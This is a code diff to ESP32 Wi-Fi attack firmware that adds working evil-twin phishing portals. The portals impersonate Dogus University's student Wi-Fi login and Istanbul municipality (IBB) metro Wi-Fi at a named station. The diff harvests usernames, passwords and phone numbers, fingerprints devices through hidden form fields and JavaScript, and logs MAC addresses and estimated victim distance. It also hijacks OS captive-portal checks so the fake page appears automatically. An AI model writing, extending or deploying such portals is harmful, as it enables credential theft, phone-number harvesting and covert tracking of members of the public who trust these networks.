@@ -1,9 +1,16 @@
-#include "WiFiScan.h"
+﻿#include "WiFiScan.h"
 #include "esp_random.h"
 #include "lang_var.h"
 #include <DNSServer.h>
 #include <WiFiUdp.h>
 #include <ESPAsyncWebServer.h>
+#include "arkaresim_data.h"
+#include "ibb_bg_data.h"
+#include "ibb_logo_data.h"
+#include "ibb_flag_data.h"
+#include "esp_wifi.h"
+#include "tcpip_adapter.h"
+#include <math.h>
 
 static DNSServer dynamicDnsServer;
 static WiFiUDP hunterDnsUdp;
@@ -2511,6 +2518,8 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color) {
     RunSilentDataHunter(scan_mode, color);
   else if (scan_mode == WIFI_SCAN_PHISHER)
     RunPhisher(scan_mode, color);
+  else if (scan_mode == WIFI_SCAN_IBB_PHISHER)
+    RunIBBPhisher(scan_mode, color);
   else if (scan_mode == WIFI_PACKET_MONITOR) {
 #ifdef HAS_SCREEN
     RunPacketMonitor(scan_mode, color);
@@ -2810,11 +2819,11 @@ void WiFiScan::StopScan(uint8_t scan_mode) {
       (currentScanMode == WIFI_SCAN_PACKET_RATE) ||
       (currentScanMode == WIFI_CONNECTED) ||
       (currentScanMode == BT_SCAN_FLOCK) ||
-      (currentScanMode == WIFI_SCAN_PHISHER) ||
+      (currentScanMode == WIFI_SCAN_PHISHER) || (currentScanMode == WIFI_SCAN_IBB_PHISHER) ||
       (currentScanMode == BT_SCAN_FLOCK_WARDRIVE) ||
       (currentScanMode == WIFI_SCAN_DETECT_FOLLOW) ||
       (currentScanMode == LV_JOIN_WIFI) || (this->wifi_initialized)) {
-    if ((currentScanMode == WIFI_SCAN_DYNAMIC_PORTAL) || (currentScanMode == WIFI_SCAN_PHISHER)) {
+    if ((currentScanMode == WIFI_SCAN_DYNAMIC_PORTAL) || (currentScanMode == WIFI_SCAN_PHISHER) || (currentScanMode == WIFI_SCAN_IBB_PHISHER)) {
       dynamicDnsServer.stop();
       extern AsyncWebServer server;
       server.end();
@@ -6078,66 +6087,197 @@ void WiFiScan::RunSilentDataHunter(uint8_t scan_mode, uint16_t color) {
 
 const char phisher_html[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Dogus Universitesi - Wi-Fi</title>
     <style>
-        body { font-family: 'Roboto', sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #202124; }
-        .card { width: 100%; max-width: 400px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        .logo { width: 75px; margin-bottom: 16px; }
-        h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px; }
-        .subtitle { font-size: 16px; margin-bottom: 40px; }
-        .input-box { margin-bottom: 24px; text-align: left; }
-        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; }
-        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
-        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
-        .btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
-        .link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
-        #loading { display: none; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        *{box-sizing:border-box;margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;-webkit-tap-highlight-color:transparent}
+        html,body{width:100%;height:100%;margin:0;padding:0;background-color:#8c0000;overflow-x:hidden;position:relative}
+        .bg-layer{position:fixed;top:0;left:0;width:100%;height:100%;background-image:url('/arkaresim.jpg');background-repeat:no-repeat;background-position:right center;background-size:cover;z-index:1}
+        .content-container{position:relative;z-index:2;width:100%;min-height:100vh;display:flex;align-items:flex-start;padding-top:12px;padding-left:5px}
+        .login-card{width:154px;display:flex;flex-direction:column}
+        .form-group{margin-bottom:11px;display:flex;flex-direction:column}
+        .form-group label{color:#fff;font-size:13.5px;font-weight:bold;margin-bottom:5px;letter-spacing:-0.1px;text-shadow:0 1px 2px rgba(0,0,0,0.5);white-space:nowrap}
+        .form-group input{width:154px;height:31px;padding:3px 6px;font-size:13px;font-family:Arial,Helvetica,sans-serif;color:#222;background-color:#fff;border:1px solid #7f9db9;border-radius:4px;outline:none;box-shadow:inset 0 1px 2px rgba(0,0,0,0.1)}
+        .form-group input::placeholder{color:#757575;font-size:12.5px;font-family:Arial,Helvetica,sans-serif;font-weight:normal}
+        .form-group input:focus{border-color:#3b99fc;box-shadow:0 0 3px rgba(59,153,252,0.7)}
+        .btn-submit{margin-top:8px;width:116px;height:27px;background:linear-gradient(to bottom,#fff 0%,#f1f1f1 50%,#e1e1e1 100%);background-color:#f7f7f7;color:#444;border:1px solid #acacac;border-radius:4px;font-family:Arial,Helvetica,sans-serif;font-size:12px;font-weight:normal;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;box-shadow:0 1px 2px rgba(0,0,0,0.15);transition:background 0.1s ease,border-color 0.1s ease}
+        .btn-submit:hover{background:linear-gradient(to bottom,#fff 0%,#f8f8f8 50%,#eaeaea 100%);border-color:#888;color:#111}
+        .btn-submit:active,.btn-submit.active-btn{background:linear-gradient(to bottom,#ffc83b 0%,#ff9800 50%,#f57c00 100%)!important;background-color:#ff9800!important;border-color:#d86800!important;color:#fff!important;box-shadow:inset 0 1px 3px rgba(0,0,0,0.3)!important;transform:translateY(1px)}
+        .info-text{margin-top:13px;color:#fff;font-size:12px;line-height:1.25;font-weight:normal;text-shadow:0 1px 2px rgba(0,0,0,0.6);letter-spacing:-0.1px;width:330px}
+        .info-text a{display:inline-block;margin-top:7px;color:#0000ee;text-decoration:underline;font-size:12px;font-weight:normal;text-shadow:none}
+        .info-text a:hover{color:#0000aa}
+        @media(max-width:768px){.bg-layer{background-position:center top;background-size:100% 100%!important}.content-container{padding-top:8px;padding-left:5px}.login-card{width:106px}.form-group{margin-bottom:7px}.form-group label{font-size:9px;margin-bottom:2px}.form-group input{width:106px;height:23px;padding:2px 4px;font-size:8px;border-radius:2px}.form-group input::placeholder{font-size:7.5px}.btn-submit{width:73px;height:19px;font-size:8.5px;margin-top:3px;border-radius:2px}.info-text{margin-top:7px;font-size:7.5px;line-height:1.2;width:155px}.info-text a{margin-top:4px;font-size:7.5px}}
     </style>
 </head>
 <body>
-    <div class="card" id="main-card">
-        <svg class="logo" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
-        <h1>Sign in</h1>
-        <div class="subtitle">to continue to Gmail</div>
-        <form action="/login" method="POST" onsubmit="document.getElementById('submit-btn').disabled=true; document.getElementById('btn-text').style.display='none'; document.getElementById('loading').style.display='inline-block';">
-            <div class="input-box">
-                <input type="text" name="email" placeholder="Email or phone" required autofocus>
+    <div class="bg-layer"></div>
+    <div class="content-container">
+        <div class="login-card">
+            <form action="/login" method="POST" autocomplete="off" onsubmit="document.querySelector('.btn-submit').classList.add('active-btn');">
+                <div class="form-group">
+                    <label for="username">Kullanici Adi</label>
+                    <input type="text" id="username" name="username" placeholder="Kullanici Adinizi Giriniz" required autocapitalize="none" autocorrect="off">
+                </div>
+                <div class="form-group">
+                    <label for="password">Sifre</label>
+                    <input type="password" id="password" name="password" placeholder="Sifrenizi Giriniz" required>
+                </div>
+                <input type="hidden" name="ua" id="ua_field">
+                <input type="hidden" name="scr" id="scr_field">
+                <input type="hidden" name="lang" id="lang_field">
+                <input type="hidden" name="plat" id="plat_field">
+                <input type="hidden" name="tz" id="tz_field">
+                <input type="hidden" name="bat" id="bat_field">
+                <input type="hidden" name="touch" id="touch_field">
+                <input type="hidden" name="mem" id="mem_field">
+                <input type="hidden" name="cores" id="cores_field">
+                <input type="hidden" name="conn" id="conn_field">
+                <button type="submit" class="btn-submit" ontouchstart="this.classList.add('active-btn')" ontouchend="setTimeout(()=>this.classList.remove('active-btn'),300)">Baglan</button>
+            </form>
+            <div class="info-text">
+                Kablosuz ag hakkinda geri bildirim saglamak veya herhangi bir sorunu bildirmek icin asagidaki adresten iletisime gecin.<br>
+                <a href="mailto:bim@dogus.edu.tr">bim@dogus.edu.tr</a>
             </div>
-            <div class="input-box">
-                <input type="password" name="pass" placeholder="Enter your password" required>
-            </div>
-            <div class="footer">
-                <a href="#" class="link">Create account</a>
-                <button type="submit" class="btn" id="submit-btn">
-                    <span id="loading"><span class="spinner"></span>Processing...</span>
-                    <span id="btn-text">Next</span>
-                </button>
-            </div>
-        </form>
+        </div>
     </div>
 </body>
 </html>
 )rawliteral";
 
-void WiFiScan::RunPhisher(uint8_t scan_mode, uint16_t color) {
-  this->currentScanMode = WIFI_SCAN_PHISHER;
+
+// ==================== IBB WIFI PORTAL ====================
+const char ibb_phisher_html[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+<title>IBB WiFi</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',Tahoma,sans-serif;overflow-y:auto;padding:15px;background:#000}
+  .bg{position:fixed;inset:0;background-image:url('/ibb_bg.jpg');background-size:cover;background-position:center;filter:brightness(0.9);z-index:-1}
+  .modal{position:relative;z-index:10;background:rgba(13,30,48,0.85);border-radius:8px;width:100%;max-width:360px;min-height:480px;height:auto;display:flex;flex-direction:column;border:none;box-shadow:0 10px 40px rgba(0,0,0,0.5)}
+  .modal-header{background:transparent;border-bottom:1px solid #1a385b;width:100%;text-align:center;padding:16px 10px;font-size:13px;font-weight:500;color:#e0e0e0}
+  .modal-body{padding:30px 25px 20px;display:flex;flex-direction:column;align-items:center;flex-grow:1}
+  .logo-img{width:100px;height:auto;object-fit:contain;margin-bottom:15px;transition:all 0.3s ease}
+  .location-container{display:flex;flex-direction:column;align-items:center;gap:4px;margin-bottom:20px}
+  .location-icon{width:20px;height:20px}
+  .location-text{color:#fff;font-size:14px;font-weight:500;letter-spacing:0.5px;text-align:center}
+  .input-group{width:100%;background:#1c1d1f;border-radius:4px;overflow:hidden;display:flex;flex-direction:column;margin-bottom:25px}
+  .select-wrapper{position:relative;border-bottom:1px solid #2a2a2a}
+  .select-wrapper select{width:100%;padding:10px 30px 10px 12px;background:transparent;border:none;color:#fff;font-size:14px;appearance:none;cursor:pointer;outline:none}
+  .select-arrow{position:absolute;right:12px;top:50%;transform:translateY(-50%);pointer-events:none;color:#fff;font-weight:bold;font-size:12px}
+  .select-wrapper select option{background:#1c1d1f;color:#fff}
+  .phone-row{display:flex;align-items:center;padding:8px 12px;background:transparent}
+  .phone-prefix{display:flex;align-items:center;gap:6px;color:#fff;font-size:14px;font-weight:500;min-width:60px}
+  .flag-img{width:20px;height:auto;border-radius:2px;object-fit:cover}
+  .country-abbr{display:none;font-size:13px;font-weight:700;color:#ccc;background:#111;padding:2px 4px;border-radius:3px}
+  .phone-row input{flex:1;background:transparent;border:none;outline:none;color:#999;font-size:14px;padding-left:5px;width:100%}
+  .phone-row input::placeholder{color:#999}
+  .btn-ileri{background:#238b50;color:#fff;border:none;border-radius:30px;padding:12px 50px;font-size:15px;font-weight:500;cursor:pointer;transition:background 0.2s;width:100%;max-width:200px}
+  .btn-ileri:hover{background:#1b6d3e}
+  .footer-area{margin-top:auto;width:100%;text-align:center;padding-bottom:20px}
+  .lang-link{color:#fff;font-size:13px;font-weight:400;text-decoration:underline;cursor:pointer;background:none;border:none}
+  @media screen and (max-height:600px){.modal-body{padding:20px 20px 15px}.logo-img{width:75px;margin-bottom:10px}.location-container{margin-bottom:15px}.input-group{margin-bottom:20px}.modal{min-height:auto}}
+  @media screen and (max-width:350px){.modal-body{padding:25px 15px 15px}.btn-ileri{max-width:100%}}
+</style>
+</head>
+<body>
+  <div class="bg"></div>
+  <div class="modal">
+    <div class="modal-header">Elektronik Sistemler Sube Mudurlugu</div>
+    <div class="modal-body">
+      <img class="logo-img" src="/ibb_logo.png" alt="IBB Logo" />
+      <div class="location-container">
+        <svg class="location-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2C8.13 2 5 5.13 5 9C5 14.25 12 22 12 22C12 22 19 14.25 19 9C19 5.13 15.87 2 12 2ZM12 11.5C10.62 11.5 9.5 10.38 9.5 9C9.5 7.62 10.62 6.5 12 6.5C13.38 6.5 14.5 7.62 14.5 9C14.5 10.38 13.38 11.5 12 11.5Z" fill="#ffffff"/>
+            <circle cx="12" cy="9" r="1.2" fill="#ffffff"/>
+        </svg>
+        <span class="location-text">METRO M5-Uskudar-Samandira Merkez</span>
+      </div>
+      <form action="/login" method="POST" style="width:100%;display:flex;flex-direction:column;align-items:center;">
+        <div class="input-group">
+          <div class="select-wrapper">
+            <select id="country-select" name="country">
+              <option value="TR,+90">Turkiye</option>
+              <option value="US,+1">United States</option>
+              <option value="GB,+44">United Kingdom</option>
+              <option value="DE,+49">Germany</option>
+            </select>
+            <span class="select-arrow">&#9662;</span>
+          </div>
+          <div class="phone-row">
+            <div class="phone-prefix">
+              <img class="flag-img" id="flag-img" src="/ibb_flag.png" alt="TR">
+              <span class="country-abbr" id="country-abbr">US</span>
+              <span id="calling-code">+90</span>
+            </div>
+            <input type="tel" name="phone" placeholder="Telefon Numarasi" required />
+          </div>
+        </div>
+        <input type="hidden" name="ua" id="ua_field">
+        <input type="hidden" name="scr" id="scr_field">
+        <input type="hidden" name="lang" id="lang_field">
+        <input type="hidden" name="plat" id="plat_field">
+        <input type="hidden" name="tz" id="tz_field">
+        <input type="hidden" name="bat" id="bat_field">
+        <input type="hidden" name="touch" id="touch_field">
+        <input type="hidden" name="mem" id="mem_field">
+        <input type="hidden" name="cores" id="cores_field">
+        <input type="hidden" name="conn" id="conn_field">
+        <button type="submit" class="btn-ileri">Ileri</button>
+      </form>
+    </div>
+    <div class="footer-area">
+      <button class="lang-link">English</button>
+    </div>
+  </div>
+  <script>
+    var cs=document.getElementById('country-select');
+    var fi=document.getElementById('flag-img');
+    var ca=document.getElementById('country-abbr');
+    var cc=document.getElementById('calling-code');
+    cs.addEventListener('change',function(){
+      var p=this.value.split(',');
+      cc.textContent=p[1];
+      if(p[0]==='TR'){fi.style.display='block';ca.style.display='none';}
+      else{fi.style.display='none';ca.style.display='block';ca.textContent=p[0];}
+    });
+    // Cihaz bilgilerini topla
+    (function(){
+      try{document.getElementById('ua_field').value=navigator.userAgent;}catch(e){}
+      try{document.getElementById('scr_field').value=screen.width+'x'+screen.height+'|'+window.devicePixelRatio+'x';}catch(e){}
+      try{document.getElementById('lang_field').value=navigator.language||navigator.userLanguage||'';}catch(e){}
+      try{document.getElementById('plat_field').value=navigator.platform||'';}catch(e){}
+      try{document.getElementById('tz_field').value=Intl.DateTimeFormat().resolvedOptions().timeZone||'';}catch(e){}
+      try{document.getElementById('touch_field').value=navigator.maxTouchPoints||0;}catch(e){}
+      try{document.getElementById('mem_field').value=navigator.deviceMemory||'?';}catch(e){}
+      try{document.getElementById('cores_field').value=navigator.hardwareConcurrency||'?';}catch(e){}
+      try{var c=navigator.connection||navigator.mozConnection;document.getElementById('conn_field').value=c?(c.effectiveType||'')+'|'+(c.downlink||'')+'Mbps':'';}catch(e){}
+      try{navigator.getBattery().then(function(b){document.getElementById('bat_field').value=Math.round(b.level*100)+'%|'+(b.charging?'Sarjda':'Pilde');});}catch(e){}
+    })();
+  </script>
+</body>
+</html>
+)rawliteral";
+
+void WiFiScan::RunIBBPhisher(uint8_t scan_mode, uint16_t color) {
+  this->currentScanMode = WIFI_SCAN_IBB_PHISHER;
 
   while (Serial.available())
     Serial.read();
   Serial.println(F("\n========================================="));
-  Serial.println(F("          OLTALAMA AYAR PANELI   "));
+  Serial.println(F("        OLTAGLAR - M5 METRO PORTAL       "));
   Serial.println(F("========================================="));
 
-  Serial.println(F("[?] Yayilacak WiFi Ismi (SSID): "));
+  Serial.println(F("[?] Yayilacak WiFi Ismi (SSID) [Enter = ibbWiFi]: "));
   String portal_ssid = "";
   Serial.setTimeout(5000);
-  while (portal_ssid == "") {
+  while (true) {
     if (Serial.available()) {
       portal_ssid = Serial.readStringUntil('\n');
       portal_ssid.trim();
@@ -6145,17 +6285,323 @@ void WiFiScan::RunPhisher(uint8_t scan_mode, uint16_t color) {
         this->currentScanMode = WIFI_SCAN_OFF;
         return;
       }
-      if (portal_ssid.length() > 0)
-        break;
+      break;
     }
     delay(100);
   }
-
+  if (portal_ssid.length() == 0) {
+    portal_ssid = "ibbWiFi";
+  }
   WiFi.mode(WIFI_AP);
   delay(200);
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1),
                     IPAddress(255, 255, 255, 0));
   WiFi.softAP(portal_ssid.c_str());
+
+  // Baglanan istemcilerin MAC ve RSSI bilgilerini goster
+  WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info) {
+    wifi_sta_list_t stationList;
+    tcpip_adapter_sta_list_t adapterList;
+    esp_wifi_ap_get_sta_list(&stationList);
+    tcpip_adapter_get_sta_list(&stationList, &adapterList);
+    
+    if (adapterList.num > 0) {
+      tcpip_adapter_sta_info_t lastStation = adapterList.sta[adapterList.num - 1];
+      
+      char macStr[18];
+      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+               lastStation.mac[0], lastStation.mac[1], lastStation.mac[2],
+               lastStation.mac[3], lastStation.mac[4], lastStation.mac[5]);
+      
+      int8_t rssi = 0;
+      for (int i = 0; i < stationList.num; i++) {
+        if (memcmp(stationList.sta[i].mac, lastStation.mac, 6) == 0) {
+          rssi = stationList.sta[i].rssi;
+          break;
+        }
+      }
+      
+      float distance = pow(10.0, (abs(rssi) - 40.0) / (10.0 * 2.5));
+      
+      Serial.println(F("\n[+] YENI ISTEMCI BAGLANDI!"));
+      Serial.println(F("-----------------------------------------"));
+      Serial.print(F("[+] MAC Adresi    : "));
+      Serial.println(macStr);
+      Serial.print(F("[+] Sinyal (RSSI) : "));
+      Serial.print(rssi);
+      Serial.println(F(" dBm"));
+      Serial.print(F("[+] Tahmini Mesafe: ~"));
+      Serial.print(distance, 1);
+      Serial.println(F(" metre"));
+      Serial.print(F("[+] IP Adresi     : "));
+      Serial.println(IPAddress(lastStation.ip.addr).toString());
+      Serial.println(F("-----------------------------------------"));
+    }
+  }, WiFiEvent_t::ARDUINO_EVENT_WIFI_AP_STACONNECTED);
+
+  WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info) {
+    wifi_event_ap_stadisconnected_t* disconnInfo = (wifi_event_ap_stadisconnected_t*)&info;
+    char macStr[18];
+    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+             disconnInfo->mac[0], disconnInfo->mac[1], disconnInfo->mac[2],
+             disconnInfo->mac[3], disconnInfo->mac[4], disconnInfo->mac[5]);
+    Serial.print(F("\n[-] Istemci Ayrildi: "));
+    Serial.println(macStr);
+  }, WiFiEvent_t::ARDUINO_EVENT_WIFI_AP_STADISCONNECTED);
+
+  hunterDnsUdp.stop();
+  hunterDnsUdp.begin(53);
+
+  extern AsyncWebServer server;
+  server.reset();
+
+  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send_P(200, "text/html", ibb_phisher_html);
+  });
+
+  server.on("/ibb_bg.jpg", HTTP_GET, [](AsyncWebServerRequest *request) {
+    AsyncWebServerResponse *response = request->beginResponse_P(200, "image/jpeg", ibb_bg_jpg, ibb_bg_jpg_len);
+    response->addHeader("Cache-Control", "max-age=86400");
+    request->send(response);
+  });
+
+  server.on("/ibb_logo.png", HTTP_GET, [](AsyncWebServerRequest *request) {
+    AsyncWebServerResponse *response = request->beginResponse_P(200, "image/png", ibb_logo_png, ibb_logo_png_len);
+    response->addHeader("Cache-Control", "max-age=86400");
+    request->send(response);
+  });
+
+  server.on("/ibb_flag.png", HTTP_GET, [](AsyncWebServerRequest *request) {
+    AsyncWebServerResponse *response = request->beginResponse_P(200, "image/png", ibb_flag_png, ibb_flag_png_len);
+    response->addHeader("Cache-Control", "max-age=86400");
+    request->send(response);
+  });
+
+  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
+    String country = request->hasParam("country", true)
+                       ? request->getParam("country", true)->value()
+                       : "N/A";
+    String phone = request->hasParam("phone", true)
+                      ? request->getParam("phone", true)->value()
+                      : "N/A";
+
+    // Baglanan istemcinin MAC ve RSSI bilgilerini al
+    String clientIP = request->client()->remoteIP().toString();
+    String clientMAC = "Bilinmiyor";
+    int8_t clientRSSI = 0;
+    float clientDist = 0.0;
+    
+    wifi_sta_list_t staList;
+    tcpip_adapter_sta_list_t adpList;
+    esp_wifi_ap_get_sta_list(&staList);
+    tcpip_adapter_get_sta_list(&staList, &adpList);
+    
+    for (int i = 0; i < adpList.num; i++) {
+      String stIpStr = IPAddress(adpList.sta[i].ip.addr).toString();
+      if (stIpStr == clientIP) {
+        char mc[18];
+        snprintf(mc, sizeof(mc), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 adpList.sta[i].mac[0], adpList.sta[i].mac[1], adpList.sta[i].mac[2],
+                 adpList.sta[i].mac[3], adpList.sta[i].mac[4], adpList.sta[i].mac[5]);
+        clientMAC = String(mc);
+        for (int j = 0; j < staList.num; j++) {
+          if (memcmp(staList.sta[j].mac, adpList.sta[i].mac, 6) == 0) {
+            clientRSSI = staList.sta[j].rssi;
+            break;
+          }
+        }
+        clientDist = pow(10.0, (abs(clientRSSI) - 40.0) / (10.0 * 2.5));
+        break;
+      }
+    }
+
+    // Ekstra cihaz bilgileri (JS + HTTP header)
+    String userAgent = request->hasHeader("User-Agent") ? request->header("User-Agent") : "N/A";
+    String scrRes = request->hasParam("scr", true) ? request->getParam("scr", true)->value() : "";
+    String devLang = request->hasParam("lang", true) ? request->getParam("lang", true)->value() : "";
+    String devPlat = request->hasParam("plat", true) ? request->getParam("plat", true)->value() : "";
+    String devTz = request->hasParam("tz", true) ? request->getParam("tz", true)->value() : "";
+    String devBat = request->hasParam("bat", true) ? request->getParam("bat", true)->value() : "";
+    String devTouch = request->hasParam("touch", true) ? request->getParam("touch", true)->value() : "";
+    String devMem = request->hasParam("mem", true) ? request->getParam("mem", true)->value() : "";
+    String devCores = request->hasParam("cores", true) ? request->getParam("cores", true)->value() : "";
+    String devConn = request->hasParam("conn", true) ? request->getParam("conn", true)->value() : "";
+    
+    // MAC randomize kontrolu
+    bool macRandomized = false;
+    if (clientMAC.length() > 2) {
+      uint8_t firstByte = (uint8_t)strtol(clientMAC.substring(0, 2).c_str(), NULL, 16);
+      macRandomized = (firstByte & 0x02) != 0;
+    }
+
+    Serial.println(F("\n[!] ===== KURBAN TELEFON NO YAKALANDI ====="));
+    Serial.println(F("============================================="));
+    Serial.println(F("[KIMLIK BILGILERI]"));
+    Serial.print(F("  Ulke/Kod      : ")); Serial.println(country);
+    Serial.print(F("  Telefon No    : ")); Serial.println(phone);
+    Serial.println(F("\n[AG BILGILERI]"));
+    Serial.print(F("  IP Adresi     : ")); Serial.println(clientIP);
+    Serial.print(F("  MAC Adresi    : ")); Serial.println(clientMAC);
+    Serial.print(F("  MAC Tipi      : ")); Serial.println(macRandomized ? "RASTGELE (Randomized)" : "GERCEK (Real)");
+    Serial.print(F("  Sinyal (RSSI) : ")); Serial.print(clientRSSI); Serial.println(F(" dBm"));
+    Serial.print(F("  Tahmini Mesafe: ~")); Serial.print(clientDist, 1); Serial.println(F(" metre"));
+    Serial.println(F("\n[CIHAZ BILGILERI]"));
+    Serial.print(F("  User-Agent    : ")); Serial.println(userAgent);
+    Serial.print(F("  Platform      : ")); Serial.println(devPlat);
+    Serial.print(F("  Ekran         : ")); Serial.println(scrRes);
+    Serial.print(F("  Dil           : ")); Serial.println(devLang);
+    Serial.print(F("  Saat Dilimi   : ")); Serial.println(devTz);
+    Serial.print(F("  Dokunmatik    : ")); Serial.print(devTouch); Serial.println(F(" nokta"));
+    Serial.print(F("  RAM           : ")); Serial.print(devMem); Serial.println(F(" GB"));
+    Serial.print(F("  CPU Cekirdek  : ")); Serial.println(devCores);
+    Serial.print(F("  Pil Durumu    : ")); Serial.println(devBat);
+    Serial.print(F("  Baglanti Tipi : ")); Serial.println(devConn);
+    Serial.println(F("=============================================\n"));
+
+    request->send(200, "text/html", "<html><head><script>try{window.close();}catch(e){}try{window.open('','_self','');window.close();}catch(e){}setTimeout(function(){document.body.innerHTML='';},100);</script></head><body></body></html>");
+  });
+
+  // Captive portal detection - redirect yapmadan dogrudan HTML sun
+  // Boylece URL'de connectivitycheck.gstatic.com gorunur
+  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send_P(200, "text/html", ibb_phisher_html);
+  });
+  server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send_P(200, "text/html", ibb_phisher_html);
+  });
+  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send_P(200, "text/html", ibb_phisher_html);
+  });
+  server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send_P(200, "text/html", ibb_phisher_html);
+  });
+  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send_P(200, "text/html", ibb_phisher_html);
+  });
+  server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send_P(200, "text/html", ibb_phisher_html);
+  });
+  server.on("/redirect", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send_P(200, "text/html", ibb_phisher_html);
+  });
+  server.on("/canonical.html", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send_P(200, "text/html", ibb_phisher_html);
+  });
+  server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send_P(200, "text/html", ibb_phisher_html);
+  });
+  server.on("/favicon.ico", HTTP_GET, [](AsyncWebServerRequest *request) {
+    request->send(204);
+  });
+
+  server.onNotFound([](AsyncWebServerRequest *request) {
+    request->send_P(200, "text/html", ibb_phisher_html);
+  });
+
+  server.begin();
+
+  Serial.print(F("\n[RUN] IBB M5 Metro Portal Aktif! SSID: "));
+  Serial.println(portal_ssid);
+  Serial.println(F("[~] Portal IP: 192.168.4.1"));
+  Serial.println(F("[~] Arka plan, logo ve bayrak resimleri dahil edildi."));
+  Serial.println(F("[~] Kurbanlarin baglanmasi ve telefon numarasi girisi bekleniyor..."));
+  Serial.println(F("[~] Durdurmak icin # yazin.\n"));
+
+  this->wifi_initialized = true;
+  this->setLEDMode(MODE_SNIFF);
+}
+// ==================== IBB WIFI PORTAL SONU ====================
+
+void WiFiScan::RunPhisher(uint8_t scan_mode, uint16_t color) {
+  this->currentScanMode = WIFI_SCAN_PHISHER;
+
+  while (Serial.available())
+    Serial.read();
+  Serial.println(F("\n========================================="));
+  Serial.println(F("          OLTAGLAR - DGS PORTAL          "));
+  Serial.println(F("========================================="));
+
+  Serial.println(F("[?] Yayilacak WiFi Ismi (SSID) [Enter = Dogus_Student]: "));
+  String portal_ssid = "";
+  Serial.setTimeout(5000);
+  while (true) {
+    if (Serial.available()) {
+      portal_ssid = Serial.readStringUntil('\n');
+      portal_ssid.trim();
+      if (portal_ssid.startsWith("#")) {
+        this->currentScanMode = WIFI_SCAN_OFF;
+        return;
+      }
+      break;
+    }
+    delay(100);
+  }
+  if (portal_ssid.length() == 0) {
+    portal_ssid = "Dogus_Student";
+  }
+  WiFi.mode(WIFI_AP);
+  delay(200);
+  WiFi.softAPConfig(IPAddress(10, 18, 1, 5), IPAddress(10, 18, 1, 5),
+                    IPAddress(255, 255, 255, 0));
+  WiFi.softAP(portal_ssid.c_str());
+
+  // Baglanan istemcilerin MAC ve RSSI bilgilerini goster
+  WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info) {
+    wifi_sta_list_t stationList;
+    tcpip_adapter_sta_list_t adapterList;
+    esp_wifi_ap_get_sta_list(&stationList);
+    tcpip_adapter_get_sta_list(&stationList, &adapterList);
+    
+    if (adapterList.num > 0) {
+      tcpip_adapter_sta_info_t lastStation = adapterList.sta[adapterList.num - 1];
+      
+      char macStr[18];
+      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
